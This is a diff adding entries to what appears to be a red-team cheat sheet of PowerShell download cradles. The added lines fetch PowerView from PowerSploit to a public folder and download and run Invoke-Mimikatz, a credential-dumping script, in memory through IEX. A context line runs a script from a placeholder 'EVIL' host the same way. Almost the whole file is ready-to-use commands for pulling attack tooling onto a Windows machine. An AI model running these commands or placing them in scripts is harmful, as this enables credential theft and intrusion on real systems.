@@ -1,3 +1,21 @@
+# PowerShell Download methods
+
+# Download powersploit using DownloadFile webclient
+(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
+
+#Download powersploit using DownloadFileAsync webclient
+(New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
+
+# Download Invoke-Mimikatz using DownloadString aka Fileless method
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
+
+# IEX also accepts pipeline input. This commands does the same thing as the previous command
+(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
+
+# PowerShell Invoke-WebRequest but it is slow to download
+Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
+
+
 # normal download cradle
 IEX (New-Object Net.Webclient).downloadstring("http://EVIL/evil.ps1")
 
